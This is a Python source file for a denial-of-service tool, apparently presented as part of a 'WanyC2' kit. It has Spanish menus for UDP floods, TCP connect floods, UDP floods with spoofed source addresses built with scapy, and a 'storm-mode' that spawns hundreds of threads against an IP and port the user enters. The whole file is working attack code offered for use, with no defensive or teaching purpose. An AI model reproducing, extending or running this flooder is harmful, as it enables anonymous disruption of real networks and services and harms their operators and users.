import os
import socket
import threading
import random
import time
from scapy.all import IP, UDP, Raw, send
from colorama import Fore, Style, init

init(autoreset=True)

ascii_art = f"""{Fore.RED}
█   █░ ▄▄▄       ███▄ ▄███▓ ██▓     ██▓    ▄████▄  
▓█░ █ ░█▒████▄    ██ ▀█▀ ██▒▓██▒    ▓██▒   ▒██▀ ▀█  
▒█░ █ ░█▒██  ▀█▄  ▓██    ▓██░▒██░    ▒██░   ▒▓█    ▄ 
░█░ █ ░█░██▄▄▄▄██ ▒██    ▒██ ▒██░    ▒██░   ▒▓▓▄ ▄██▒
░░██▒██▓ ▓█   ▓██▒▒██▒   ░██▒░██████▒░██████▒ ▓███▀ ░
░ ▓░▒ ▒ ▒▒ ▓▒█░░ ▒░   ░  ░░ ▒░▓  ░░ ▒░▓  ░░ ░▒ ▒  ░
  ▒ ░ ░ ░▒ ▒░ ░ ░      ░ ░ ░ ▒  ░░ ░ ▒  ░  ░  ▒   
  ░   ░ ░░ ░   ░      ░     ░   ░ ░   ░    ░        
    ░   ░  ░          ░     ░  ░    ░  ░  ░ ░      
                                          ░        
{Fore.WHITE}
               code by: ant-vcryz
               Power: WanyC2 Full Edition

{Style.RESET_ALL}"""

def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65500)
    while time.time() < timeout:
        try:
            sock.sendto(data, (ip, port))
            print(f"{Fore.YELLOW}[UDP]{Style.RESET_ALL} Sent packet to {ip}:{port}")
        except:
            pass

def tcp_attack(ip, port, duration):
    timeout = time.time() + duration
    data = random._urandom(65500)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
            print(f"{Fore.BLUE}[TCP]{Style.RESET_ALL} Sent packet to {ip}:{port}")
        except:
            pass

def spoofed_udp(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        spoof_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        pkt = IP(src=spoof_ip, dst=ip)/UDP(dport=port)/Raw(load=os.urandom(1024))
        send(pkt, verbose=False)
        print(f"{Fore.MAGENTA}[SPOOF]{Style.RESET_ALL} Spoofed packet from {spoof_ip} to {ip}:{port}")

def udp_pps(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        spoof_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        pkt = IP(src=spoof_ip, dst=ip)/UDP(dport=port, sport=random.randint(1024,65535))/Raw(load=os.urandom(1024))
        send(pkt, verbose=False)

def storm_mode(ip, port, duration):
    methods = [udp_attack, tcp_attack, spoofed_udp, udp_pps]
    for _ in range(200):
        threading.Thread(target=random.choice(methods), args=(ip, port, duration)).start()

def start_attack(ip, port, method, duration):
    print(f"{Fore.GREEN}[+] Ataque iniciado a {ip}:{port} con método {method.upper()} durante {duration}s.{Style.RESET_ALL}")
    method_func = {
        'udp': udp_attack,
        'tcp': tcp_attack,
        'spoof': spoofed_udp,
        'udp-pps': udp_pps,
        'storm-mode': storm_mode
    }.get(method)

    if not method_func:
        print(f"{Fore.RED}Método inválido.{Style.RESET_ALL}")
        return

    for _ in range(150):
        threading.Thread(target=method_func, args=(ip, port, duration)).start()

    time.sleep(1)
    again = input(f"{Fore.CYAN}¿Quieres realizar otro ataque? (y/n): {Style.RESET_ALL}").strip().lower()
    if again == 'y':
        main_menu()

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_art)
        print(f"{Fore.YELLOW}[-] MÉTODOS DISPONIBLES{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[+] udp")
        print(f"{Fore.CYAN}[+] tcp")
        print(f"{Fore.CYAN}[+] spoof")
        print(f"{Fore.CYAN}[+] udp-pps")
        print(f"{Fore.RED}[+] storm-mode (máxima potencia){Style.RESET_ALL}")
        print("\nEscribe el método que quieres usar o 'salir' para terminar.")
        method = input(">> ").lower()

        if method in ["udp", "tcp", "spoof", "udp-pps", "storm-mode"]:
            ip = input("IP objetivo: ")
            port = int(input("Puerto: "))
            duration = int(input("Duración (segundos): "))
            start_attack(ip, port, method, duration)
            input("ENTER para regresar al menú.")
        elif method == "salir":
            break
        else:
            print("Método inválido. Regresando al menú...")
            input("Presiona ENTER para continuar.")

main_menu()
